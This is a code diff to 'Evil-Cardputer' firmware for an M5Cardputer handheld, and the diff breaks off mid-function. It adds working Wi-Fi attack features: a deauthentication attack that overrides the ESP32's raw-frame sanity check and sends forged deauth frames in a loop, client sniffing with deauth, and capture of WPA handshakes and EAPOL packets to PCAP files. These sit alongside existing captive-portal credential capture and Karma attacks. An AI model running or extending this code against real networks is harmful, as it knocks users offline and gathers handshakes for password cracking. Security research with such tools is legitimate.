@@ -41,6 +41,23 @@
 #include <TinyGPSPlus.h>
 #include <Adafruit_NeoPixel.h> //led
 #include "M5Cardputer.h"
+#include <ArduinoJson.h>
+#include "BLEDevice.h"
+#include <vector>
+#include <esp_task_wdt.h>
+
+//deauth
+#include "esp_wifi_types.h"
+#include "esp_event_loop.h"
+//deauth end
+
+//sniff and deauth client
+#include "esp_err.h"
+#include "nvs_flash.h"
+#include <map>
+#include <algorithm>
+#include <regex>
+//sniff and deauth client end
 
 extern "C" {
 #include "esp_wifi.h"
@@ -57,7 +74,7 @@ const byte DNS_PORT = 53;
 
 int currentIndex = 0, lastIndex = -1;
 bool inMenu = true;
-const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Set Wifi SSID", "Set Wifi Password", "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Creds", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Karma Spear", "Select Probe", "Delete Probe", "Delete All Probes", "Brightness", "Wardriving", "Beacon Spam"};
+const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Set Wifi SSID", "Set Wifi Password", "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Creds", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Karma Spear", "Select Probe", "Delete Probe", "Delete All Probes", "Brightness", "Wardriving", "Beacon Spam" , "Deauther", "Client Sniffing and Deauth", "Handshake/Deauth Sniffing", "Check Handshakes", "Wall Of Flipper"};
 const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
 
 const int maxMenuDisplay = 11;
@@ -185,6 +202,55 @@ TinyGPSPlus gps;
 HardwareSerial cardgps(2); // Create a HardwareSerial object on UART2
 
 bool isItSerialCommand = false;
+
+
+
+// deauth and pwnagotchi detector part
+
+const long channelHopInterval = 5000; // hoppping time interval
+unsigned long lastChannelHopTime = 0;
+int currentChannelDeauth = 1;
+bool autoChannelHop = false; // Commence en mode auto
+int lastDisplayedChannelDeauth = -1;
+bool lastDisplayedMode = !autoChannelHop; // Initialisez à l'opposé pour forcer la première mise à jour
+unsigned long lastScreenClearTime = 0; // Pour suivre le dernier effacement de l'écran
+char macBuffer[18];
+int maxChannelScanning = 13;
+
+
+int nombreDeHandshakes = 0; // Nombre de handshakes/PMKID capturés
+int nombreDeDeauth = 0;
+int nombreDeEAPOL = 0;
+File pcapFile;
+// deauth and pwnagotchi detector end
+
+// Sniff and deauth clients
+
+std::map<std::string, std::vector<std::string>> connections;
+std::map<std::string, std::string> ap_names;
+std::set<int> ap_channels;
+std::map<std::string, int> ap_channels_map;
+
+//If you change these value you need to change it also in the code on deauthClients function
+unsigned long lastScanTime = 0;
+unsigned long scanInterval = 90000; // interval of deauth and scanning network
+
+unsigned long lastChannelChange = 0;
+unsigned long channelChangeInterval = 15000; // interval of channel switching
+
+unsigned long lastClientPurge = 0;
+unsigned long clientPurgeInterval = 300000; //interval of clearing the client to exclude no more connected client or ap that not near anymore
+
+unsigned long deauthWaitingTime = 5000; //interval of time to capture EAPOL after sending deauth frame
+static unsigned long lastPrintTime = 0;
+
+int nbDeauthSend = 10;
+
+bool isDeauthActive = false;
+bool isDeauthFast = false;
+
+// Sniff and deauth clients end
+
 
 void setup() {
   M5.begin();
@@ -408,7 +474,7 @@ void setup() {
   M5.Display.setCursor(64, textY + 20);
   M5.Display.println("By 7h30th3r0n3");
   M5.Display.setCursor(84, textY + 45);
-  M5.Display.println("v1.1.7 2024");
+  M5.Display.println("v1.2.2 2024");
   Serial.println("By 7h30th3r0n3");
   Serial.println("-------------------");
   M5.Display.setCursor(34, textY + 80);
@@ -632,6 +698,21 @@ void executeMenuItem(int index) {
       break;
     case 21:
       beaconAttack();
+      break;
+    case 22:
+      deauthAttack(currentListIndex);
+      break;
+    case 23:
+      deauthClients();
+      break;
+    case 24:
+      deauthDetect();
+      break;
+    case 25:
+      checkHandshakes();
+      break;
+    case 26:
+      wallOfFlipper();
       break;
   }
   isOperationInProgress = false;
@@ -1119,7 +1200,7 @@ void showWifiList() {
       Serial.println("-------------------");
       Serial.println("SSID " + ssidList[currentListIndex] + " selected");
       Serial.println("-------------------");
-      waitAndReturnToMenu(ssidList[currentListIndex] + "\n      selected");
+      waitAndReturnToMenu(ssidList[currentListIndex] + " selected");
       needsDisplayUpdate = true;  // Marquer pour mise à jour de l'affichage
       keyHandled = true;
     } else if (!M5Cardputer.Keyboard.isKeyPressed(';') &&
@@ -1463,7 +1544,7 @@ void createCaptivePortal() {
     delay(50);
   }
   if (!isProbeKarmaAttackMode && !isAutoKarmaActive) {
-    waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
+    waitAndReturnToMenu("Portal " + ssid + " Deployed");
   }
 }
 
@@ -2522,7 +2603,7 @@ void brightness() {
   }
 
   float finalBrightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
-  waitAndReturnToMenu("Brightness set to \n\n          " + String((int)finalBrightnessPercentage) + "%");
+  waitAndReturnToMenu("Brightness set to " + String((int)finalBrightnessPercentage) + "%");
 }
 
 
@@ -3881,9 +3962,9 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.1.7"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.2.2"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardpiuter";
-  preHeader += ",release=v1.1.7"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.2.2"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -4282,8 +4363,9 @@ void beaconAttack() {
       beaconCount++;
     }
 
-    M5.update(); M5Cardputer.update();
-    if (M5.BtnB.isPressed() && currentMillis - lastDebounceTime > debounceDelay) {
+    M5.update();
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && currentMillis - lastDebounceTime > debounceDelay) {
       break;
     }
     delay(10);
@@ -4345,7 +4427,7 @@ void setWifiSSID() {
             M5.Display.setCursor(0, 10);
             M5.Display.println("SSID Error:");
             M5.Display.setCursor(0, 30);
-            M5.Display.println("Must be superior to 0");
+            M5.Display.println("Must be superior to 0 and max 32");
             M5.Display.display();
             delay(2000); // Affiche le message pendant 2 secondes
             M5.Display.clear();
@@ -4431,3 +4513,1457 @@ void setWifiPassword() {
 
 
 // Set wifi and password ssid end
+
+
+
+
+
+
+
+// sniff handshake/deauth/pwnagotchi
+
+bool beacon = false;
+std::set<String> registeredBeacons;
+unsigned long lastTime = 0;  // Last time update
+unsigned int packetCount = 0;  // Number of packets received
+
+void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  packetCount++;
+  unsigned long currentTime = millis();
+  if (currentTime - lastTime >= 1000) {
+    if (packetCount < 100) {
+      M5.Lcd.setCursor(M5.Display.width() - 48, 0);
+    } else {
+      M5.Lcd.setCursor(M5.Display.width() - 54, 0);
+    }
+    M5.Lcd.printf(" PPS:%d ", packetCount);
+
+    lastTime = currentTime;
+    packetCount = 0;
+  }
+
+  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
+
+  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
+  const uint8_t *frame = pkt->payload;
+  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
+
+
+  const uint8_t frameType = (frameControl & 0x0C) >> 2;
+  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;
+
+  if (estUnPaquetEAPOL(pkt)) {
+    Serial.println("EAPOL Detected !!!!");
+
+    const uint8_t *receiverAddr = frame + 4;
+    const uint8_t *senderAddr = frame + 10;
+
+    Serial.print("Address MAC destination: ");
+    printAddress(receiverAddr);
+    Serial.print("Address MAC expedition: ");
+    printAddress(senderAddr);
+
+    enregistrerDansFichierPCAP(pkt, false);
+    nombreDeEAPOL++;
+    M5.Lcd.setCursor(M5.Display.width() - 30, 10);
+    M5.Lcd.printf("H:");
+    M5.Lcd.print(nombreDeHandshakes);
+    if (nombreDeEAPOL < 999) {
+      M5.Lcd.setCursor(M5.Display.width() - 54, 20);
+    } else {
+      M5.Lcd.setCursor(M5.Display.width() - 60, 20);
+    }
+    M5.Lcd.printf("EAPOL:");
+    M5.Lcd.print(nombreDeEAPOL);
+  }
+
+  if (frameType == 0x00 && frameSubType == 0x08) {
+    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon
+
+    // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
+    char macStr[18];
+    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);
+
+    if (strcmp(macStr, "DE:AD:BE:EF:DE:AD") == 0) {
+      Serial.println("-------------------");
+      Serial.println("Pwnagotchi Detected !!!");
+      Serial.print("CH: ");
+      Serial.println(ctrl.channel);
+      Serial.print("RSSI: ");
+      Serial.println(ctrl.rssi);
+      Serial.print("MAC: ");
+      Serial.println(macStr);
+      Serial.println("-------------------");
+
+      String essid = ""; // Préparer la chaîne pour l'ESSID
+      int essidMaxLength = 700; // longueur max
+      for (int i = 0; i < essidMaxLength; i++) {
+        if (frame[i + 38] == '\0') break; // Fin de l'ESSID
+
+        if (isAscii(frame[i + 38])) {
+          essid.concat((char)frame[i + 38]);
+        }
+      }
+
+      int jsonStart = essid.indexOf('{');
+      if (jsonStart != -1) {
+        String cleanJson = essid.substring(jsonStart); // Nettoyer le JSON
+
+        DynamicJsonDocument json(4096); // Augmenter la taille pour l'analyse
+        DeserializationError error = deserializeJson(json, cleanJson);
+
+        if (!error) {
+          String name = json["name"].as<String>(); // Extraire le nom
+          String pwndnb = json["pwnd_tot"].as<String>(); // Extraire le nombre de réseaux pwned
+          Serial.println("Name: " + name); // Afficher le nom
+          Serial.println("pwnd: " + pwndnb); // Afficher le nombre de réseaux pwned
+          // affichage
+          displayPwnagotchiDetails(name, pwndnb);
+        } else {
+          Serial.println("Could not parse Pwnagotchi json");
+        }
+      } else {
+        Serial.println("JSON start not found in ESSID");
+      }
+    } else {
+      pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
+      enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet
+
+    }
+  }
+
+  // Vérifier si c'est un paquet de désauthentification
+  if (frameType == 0x00 && frameSubType == 0x0C) {
+    // Extraire les adresses MAC
+    const uint8_t *receiverAddr = frame + 4;  // Adresse 1
+    const uint8_t *senderAddr = frame + 10;  // Adresse 2
+    // Affichage sur le port série
+    Serial.println("-------------------");
+    Serial.println("Deauth Packet detected !!! :");
+    Serial.print("CH: ");
+    Serial.println(ctrl.channel);
+    Serial.print("RSSI: ");
+    Serial.println(ctrl.rssi);
+    Serial.print("Sender: "); printAddress(senderAddr);
+    Serial.print("Receiver: "); printAddress(receiverAddr);
+    Serial.println();
+
+    // Affichage sur l'écran
+    M5.Lcd.setTextColor(WHITE, BLACK);
+    M5.Lcd.setCursor(0, M5.Display.height() / 3 - 16);
+    M5.Lcd.printf("Deauth Detected!");
+    M5.Lcd.setCursor(0, M5.Display.height() / 3 - 8);
+    M5.Lcd.printf("CH: %d RSSI: %d  ", ctrl.channel, ctrl.rssi);
+    M5.Lcd.setCursor(0, M5.Display.height() / 3 );
+    M5.Lcd.print("Send: "); printAddressLCD(senderAddr);
+    M5.Lcd.setCursor(0, M5.Display.height() / 3 + 8);
+    M5.Lcd.print("Receive: "); printAddressLCD(receiverAddr);
+    nombreDeDeauth++;
+    if (nombreDeDeauth < 999) {
+      M5.Lcd.setCursor(M5.Display.width() - 60, 30);
+    } else {
+      M5.Lcd.setCursor(M5.Display.width() - 68, 30);
+    }
+    M5.Lcd.printf("DEAUTH:");
+    M5.Lcd.print(nombreDeDeauth);
+
+  }
+}
+
+void displayPwnagotchiDetails(const String& name, const String& pwndnb) {
+  // Construire le texte à afficher
+  String displayText = "Pwnagotchi: " + name + "      \npwnd: " + pwndnb + "   ";
+
+  // Préparer l'affichage
+  M5.Lcd.setTextColor(WHITE, BLACK);
+  M5.Lcd.setCursor(0, M5.Display.height() - 50);
+
+  // Afficher les informations
+  M5.Lcd.println(displayText);
+}
+
+void printAddress(const uint8_t* addr) {
+  for (int i = 0; i < 6; i++) {
+    Serial.printf("%02X", addr[i]);
+    if (i < 5) Serial.print(":");
+  }
+  Serial.println();
+}
+
+void printAddressLCD(const uint8_t* addr) {
+  // Utiliser sprintf pour formater toute l'adresse MAC en une fois
+  sprintf(macBuffer, "%02X:%02X:%02X:%02X:%02X:%02X",
+          addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);
+
+  // Afficher l'adresse MAC
+  M5.Lcd.print(macBuffer);
+}
+
+unsigned long lastBtnBPressTime = 0;
+const long debounceDelay = 200;
+
+void deauthDetect() {
+  bool btnBPressed = false;
+  unsigned long lastKeyPressTime = 0;  // Temps de la dernière pression de touche
+  const unsigned long debounceDelay = 300;  // Delai de debounce en millisecondes
+
+  M5.Display.clear();
+  M5.Lcd.setTextSize(1);
+  M5.Lcd.setTextColor(WHITE, BLACK);
+
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_start();
+  WiFi.mode(WIFI_STA);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
+  esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
+
+  int x_btnA = 32;
+  int x_btnB = 140;
+  int y_btns = 122;
+
+  M5.Lcd.setCursor(x_btnA, y_btns);
+  M5.Lcd.println("Mode:m");
+
+  M5.Lcd.setCursor(x_btnB, y_btns);
+  M5.Lcd.println("Back:ok");
+
+  if (!SD.exists("/handshakes") && !SD.mkdir("/handshakes")) {
+    Serial.println("Fail to create /handshakes folder");
+    return;
+  }
+  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+    M5.update();
+    M5Cardputer.update();
+    delay(10); // Petit délai pour réduire la charge du processeur
+  }
+  while (!btnBPressed) {
+    esp_task_wdt_reset();
+    vTaskDelay(pdMS_TO_TICKS(10));
+    M5.update();
+    M5Cardputer.update();
+
+    unsigned long currentPressTime = millis();
+    bool keyPressedEnter = M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER);
+
+    if (keyPressedEnter && currentPressTime - lastKeyPressTime > debounceDelay) {
+      btnBPressed = true;
+      lastKeyPressTime = currentPressTime;
+    }
+
+    if (M5Cardputer.Keyboard.isKeyPressed('m') && currentPressTime - lastKeyPressTime > debounceDelay) {
+      autoChannelHop = !autoChannelHop;
+      Serial.println(autoChannelHop ? "Auto Mode" : "Static Mode");
+      lastKeyPressTime = currentPressTime;
+    }
+
+    if (!autoChannelHop) {
+      if (M5Cardputer.Keyboard.isKeyPressed(',') && currentPressTime - lastKeyPressTime > debounceDelay) {
+        currentChannelDeauth = currentChannelDeauth > 1 ? currentChannelDeauth - 1 : maxChannelScanning;
+        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
+        Serial.print("Static Channel : ");
+        Serial.println(currentChannelDeauth);
+        lastKeyPressTime = currentPressTime;
+      }
+
+      if (M5Cardputer.Keyboard.isKeyPressed('/') && currentPressTime - lastKeyPressTime > debounceDelay) {
+        currentChannelDeauth = currentChannelDeauth < maxChannelScanning ? currentChannelDeauth + 1 : 1;
+        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
+        Serial.print("Static Channel : ");
+        Serial.println(currentChannelDeauth);
+        lastKeyPressTime = currentPressTime;
+      }
+    }
+
+    if (autoChannelHop && currentPressTime - lastChannelHopTime > channelHopInterval) {
+      currentChannelDeauth = (currentChannelDeauth % maxChannelScanning) + 1;
+      esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
+      Serial.print("Auto Channel : ");
+      Serial.println(currentChannelDeauth);
+      lastChannelHopTime = currentPressTime;
+    }
+
+    if (currentChannelDeauth != lastDisplayedChannelDeauth || autoChannelHop != lastDisplayedMode) {
+      M5.Lcd.setCursor(0, 0);
+      M5.Lcd.printf("Channel: %d    \n", currentChannelDeauth);
+      lastDisplayedChannelDeauth = currentChannelDeauth;
+    }
+
+    if (autoChannelHop != lastDisplayedMode) {
+      M5.Lcd.setCursor(0, 10);
+      M5.Lcd.printf("Mode: %s  \n", autoChannelHop ? "Auto" : "Static");
+      lastDisplayedMode = autoChannelHop;
+    }
+
+    delay(10);
+  }
+
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_stop();
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  esp_wifi_deinit();
+  esp_wifi_init(&cfg);
+  esp_wifi_start();
+  delay(100); // Petite pause pour s'assurer que tout est terminé
+
+  waitAndReturnToMenu("Stop detection...");
+}
+
+
+// sniff pcap
+bool estUnPaquetEAPOL(const wifi_promiscuous_pkt_t* packet) {
+  const uint8_t *payload = packet->payload;
+  int len = packet->rx_ctrl.sig_len;
+
+  // length check to ensure packet is large enough for EAPOL (minimum length)
+  if (len < (24 + 8 + 4)) { // 24 bytes for the MAC header, 8 for LLC/SNAP, 4 for EAPOL minimum
+    return false;
+  }
+
+  // check for LLC/SNAP header indicating EAPOL payload
+  // LLC: AA-AA-03, SNAP: 00-00-00-88-8E for EAPOL
+  if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 &&
+      payload[27] == 0x00 && payload[28] == 0x00 && payload[29] == 0x00 &&
+      payload[30] == 0x88 && payload[31] == 0x8E) {
+    return true;
+  }
+
+  // handle QoS tagging which shifts the start of the LLC/SNAP headers by 2 bytes
+  // check if the frame control field's subtype indicates a QoS data subtype (0x08)
+  if ((payload[0] & 0x0F) == 0x08) {
+    // Adjust for the QoS Control field and recheck for LLC/SNAP header
+    if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 &&
+        payload[29] == 0x00 && payload[30] == 0x00 && payload[31] == 0x00 &&
+        payload[32] == 0x88 && payload[33] == 0x8E) {
+      return true;
+    }
+  }
+
+  return false;
+}
+
+
+// Définition de l'en-tête de fichier PCAP global
+typedef struct pcap_hdr_s {
+  uint32_t magic_number;   /* numéro magique */
+  uint16_t version_major;  /* numéro de version majeur */
+  uint16_t version_minor;  /* numéro de version mineur */
+  int32_t  thiszone;       /* correction de l'heure locale */
+  uint32_t sigfigs;        /* précision des timestamps */
+  uint32_t snaplen;        /* taille max des paquets capturés, en octets */
+  uint32_t network;        /* type de données de paquets */
+} pcap_hdr_t;
+
+// Définition de l'en-tête d'un paquet PCAP
+typedef struct pcaprec_hdr_s {
+  uint32_t ts_sec;         /* timestamp secondes */
+  uint32_t ts_usec;        /* timestamp microsecondes */
+  uint32_t incl_len;       /* nombre d'octets du paquet enregistrés dans le fichier */
+  uint32_t orig_len;       /* longueur réelle du paquet */
+} pcaprec_hdr_t;
+
+
+void ecrireEntetePCAP(File &file) {
+  pcap_hdr_t pcap_header;
+  pcap_header.magic_number = 0xa1b2c3d4;
+  pcap_header.version_major = 2;
+  pcap_header.version_minor = 4;
+  pcap_header.thiszone = 0;
+  pcap_header.sigfigs = 0;
+  pcap_header.snaplen = 65535;
+  pcap_header.network = 105; // LINKTYPE_IEEE802_11
+
+  file.write((const byte*)&pcap_header, sizeof(pcap_hdr_t));
+  nombreDeHandshakes++;
+}
+
+void enregistrerDansFichierPCAP(const wifi_promiscuous_pkt_t* packet, bool beacon) {
+  // Construire le nom du fichier en utilisant les adresses MAC de l'AP et du client
+  const uint8_t *addr1 = packet->payload + 4;  // Adresse du destinataire (Adresse 1)
+  const uint8_t *addr2 = packet->payload + 10; // Adresse de l'expéditeur (Adresse 2)
+  const uint8_t *bssid = packet->payload + 16; // Adresse BSSID (Adresse 3)
+  const uint8_t *apAddr;
+
+  if (memcmp(addr1, bssid, 6) == 0) {
+    apAddr = addr1;
+  } else {
+    apAddr = addr2;
+  }
+
+  char nomFichier[50];
+  sprintf(nomFichier, "/handshakes/HS_%02X%02X%02X%02X%02X%02X.pcap",
+          apAddr[0], apAddr[1], apAddr[2], apAddr[3], apAddr[4], apAddr[5]);
+
+  // Vérifier si le fichier existe déjà
+  bool fichierExiste = SD.exists(nomFichier);
+
+  // Si probe est true et que le fichier n'existe pas, ignorer l'enregistrement
+  if (beacon && !fichierExiste) {
+    return;
+  }
+
+  // Ouvrir le fichier en mode ajout si existant sinon en mode écriture
+  File fichierPcap = SD.open(nomFichier, fichierExiste ? FILE_APPEND : FILE_WRITE);
+  if (!fichierPcap) {
+    Serial.println("Échec de l'ouverture du fichier PCAP");
+    return;
+  }
+
+  if (!beacon && !fichierExiste) {
+    Serial.println("Écriture de l'en-tête global du fichier PCAP");
+    ecrireEntetePCAP(fichierPcap);
+  }
+
+  if (beacon && fichierExiste) {
+    String bssidStr = String((char*)apAddr, 6);
+    if (registeredBeacons.find(bssidStr) != registeredBeacons.end()) {
+      return; // Beacon déjà enregistré pour ce BSSID
+    }
+    registeredBeacons.insert(bssidStr); // Ajouter le BSSID à l'ensemble
+  }
+
+  // Écrire l'en-tête du paquet et le paquet lui-même dans le fichier
+  pcaprec_hdr_t pcap_packet_header;
+  pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
+  pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
+  pcap_packet_header.incl_len = packet->rx_ctrl.sig_len;
+  pcap_packet_header.orig_len = packet->rx_ctrl.sig_len;
+  fichierPcap.write((const byte*)&pcap_packet_header, sizeof(pcaprec_hdr_t));
+  fichierPcap.write(packet->payload, packet->rx_ctrl.sig_len);
+  fichierPcap.close();
+}
+//sniff pcap end
+
+
+
+
+// deauther start
+// Big thanks to Aro2142 (https://github.com/7h30th3r0n3/Evil-M5Core2/issues/16)
+// Even Bigger thanks to spacehuhn https://github.com/spacehuhn / https://spacehuhn.com/
+// Big thanks to the Nemo project for the easy bypass: https://github.com/n0xa/m5stick-nemo
+// Reference to understand : https://github.com/risinek/esp32-wifi-penetration-tool/tree/master/components/wsl_bypasser
+
+// Warning
+// You need to bypass the esp32 firmware with scripts in utilities before compiling or deauth is not working due to restrictions on ESP32 firmware
+// Warning
+
+void snifferCallbackDeauth(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
+  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
+  const uint8_t *frame = pkt->payload;
+  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
+
+  const uint8_t frameType = (frameControl & 0x0C) >> 2;
+  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;
+
+  if (estUnPaquetEAPOL(pkt)) {
+    Serial.println("EAPOL Detected !!!!");
+
+    const uint8_t *receiverAddr = frame + 4;
+    const uint8_t *senderAddr = frame + 10;
+
+    Serial.print("Address MAC destination: ");
+    printAddress(receiverAddr);
+    Serial.print("Address MAC expedition: ");
+    printAddress(senderAddr);
+
+    enregistrerDansFichierPCAP(pkt, false);
+    nombreDeEAPOL++;
+    M5.Lcd.setCursor(M5.Display.width() - 30, 0);
+    M5.Lcd.printf("H:");
+    M5.Lcd.print(nombreDeHandshakes);
+    if (nombreDeEAPOL < 99) {
+      M5.Lcd.setCursor(M5.Display.width() - 30, 12);
+    } else if (nombreDeEAPOL < 999) {
+      M5.Lcd.setCursor(M5.Display.width() - 38, 12);
+    } else {
+      M5.Lcd.setCursor(M5.Display.width() - 46, 12);
+    }
+    M5.Lcd.printf("E:");
+    M5.Lcd.print(nombreDeEAPOL);
+  }
+
+  if (frameType == 0x00 && frameSubType == 0x08) {
+    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon
+
+    // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
+    char macStr[18];
+    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);
+
+
+    pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
+    enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet
+  }
+
+}
+
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+  if (arg == 31337)
+    return 1;
+  else
+    return 0;
+}
+
+// MAC source
+uint8_t source_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00,};
+//MAC client
+uint8_t receiver_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //brodcast // should not work on some device that need to be mac spoofed
+//MAC access point
+uint8_t ap_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00,};
+
+static const uint8_t deauth_frame_default[] = {
+  0xc0, 0x00, 0x3a, 0x01,
+  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0xf0, 0xff, 0x02, 0x00
+};
+
+void updateMacAddresses(const uint8_t* bssid) {
+  memcpy(source_mac, bssid, 6);
+  memcpy(ap_mac, bssid, 6);
+}
+
+int deauthCount = 0;
+void deauthAttack(int networkIndex) {
+
+  if (!SD.exists("/handshakes")) {
+    if (SD.mkdir("/handshakes")) {
+      Serial.println("/handshakes folder created");
+    } else {
+      Serial.println("Fail to create /handshakes folder");
+      return;
+    }
+  }
+  String ssid = WiFi.SSID(networkIndex);
+  if (!confirmPopup("Deauth attack on: " + ssid)) {
+    inMenu = true;
+    drawMenu();
+    return;
+  }
+  Serial.println("Deauth attack started");
+
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_stop();
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  esp_wifi_deinit();
+  delay(300); // Petite pause pour s'assurer que tout est terminé
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_set_mode(WIFI_MODE_STA); // Set station mode
+  esp_wifi_start(); // start Wi-Fi
+
+  if (confirmPopup("   Do you want to sniff EAPOL ?")) {
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(snifferCallbackDeauth);
+  }
+
+  if (networkIndex < 0 || networkIndex >= numSsid) {
+    Serial.println("Network index out of bounds");
+    return;
+  }
+  M5.Display.clear();
+
+  // Récupérer les informations de l'AP sélectionné
+  uint8_t* bssid = WiFi.BSSID(networkIndex);
+  int channel = WiFi.channel(networkIndex);
+  String macAddress = bssidToString(bssid);
+
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  currentChannelDeauth = channel;
+  updateMacAddresses(bssid);
+
+  Serial.print("SSID: "); Serial.println(ssid);
+  Serial.print("MAC Address: "); Serial.println(macAddress);
+  Serial.print("Channel: "); Serial.println(channel);
+
+  if (!bssid || channel <= 0) {
+    Serial.println("Invalid AP - aborting attack");
+    M5.Display.println("Invalid AP");
+    return;
+  }
+
+  int delayTime = 500; // initial delay between deauth packets
+  unsigned long previousMillis = 0;
+  const int debounceDelay = 50;
+  unsigned long lastDebounceTime = 0;
+
+  // Setup display
+  M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
+  M5.Display.setCursor(M5.Display.width() / 2 - 24, M5.Display.height() - 16);
+  M5.Display.setTextColor(TFT_WHITE);
+  M5.Display.println("Stop");
+
+  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+  M5.Display.setCursor(10, 20);
+  M5.Display.println("SSID: " + ssid);
+  M5.Display.setCursor(10, 32);
+  M5.Display.println("MAC: " + macAddress);
+  M5.Display.setCursor(10, 44);
+  M5.Display.println("Channel : " + String(channel));
+
+  M5.Display.setCursor(10, 56);
+  M5.Display.print("Deauth sent: ");
+  Serial.println("-------------------");
+  Serial.println("Starting Deauth Attack");
+  Serial.println("-------------------");
+  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+    M5.update();
+    M5Cardputer.update();
+    delay(10); // Petit délai pour réduire la charge du processeur
+  }
+  while (true) {
+    unsigned long currentMillis = millis();
+
+    if (currentMillis - previousMillis >= delayTime) {
+      previousMillis = currentMillis;
+
+      sendDeauthPacket();
+      deauthCount++;
+
+      M5.Display.setCursor(88, 56);
+      M5.Display.print(String(deauthCount));
+
+      M5.Display.setCursor(10, 68);
+      M5.Display.print("Delay: " + String(delayTime) + "ms    ");
+
+      Serial.println("-------------------");
+      Serial.println("Deauth packet sent : " + String(deauthCount));
+      Serial.println("-------------------");
+    }
+
+    M5.update();
+    M5Cardputer.update();
+    // Adjust delay with buttons
+    if (M5Cardputer.Keyboard.isKeyPressed(',') && currentMillis - lastDebounceTime > debounceDelay) {
+      lastDebounceTime = currentMillis;
+      delayTime = max(500, delayTime - 100); // Decrease delay
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed('/') && currentMillis - lastDebounceTime > debounceDelay) {
+      lastDebounceTime = currentMillis;
+      delayTime = min(3000, delayTime + 100); // Increase delay
+    }
